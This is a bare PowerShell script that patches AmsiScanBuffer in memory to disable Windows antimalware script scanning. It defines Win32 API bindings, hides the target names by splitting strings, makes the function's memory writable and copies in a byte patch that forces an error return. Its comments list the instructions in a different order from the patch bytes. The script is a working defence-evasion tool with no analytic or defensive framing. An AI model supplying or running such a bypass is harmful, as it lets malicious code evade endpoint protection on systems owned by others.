$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
 [DllImport("kernel32")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 [DllImport("kernel32")]
 public static extern IntPtr LoadLibrary(string name);
 [DllImport("kernel32")]
 public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32 

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
# POP R14
# POP R15
# POP RDI
$Patch = [Byte[]] (0x41, 0x5F, 0x41, 0x5E, 0x5F, 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$Address = [Int64]$Address + 0x14
$new = [System.Runtime.InteropServices.Marshal]
$new::Copy($Patch, 0, $Address, 11)
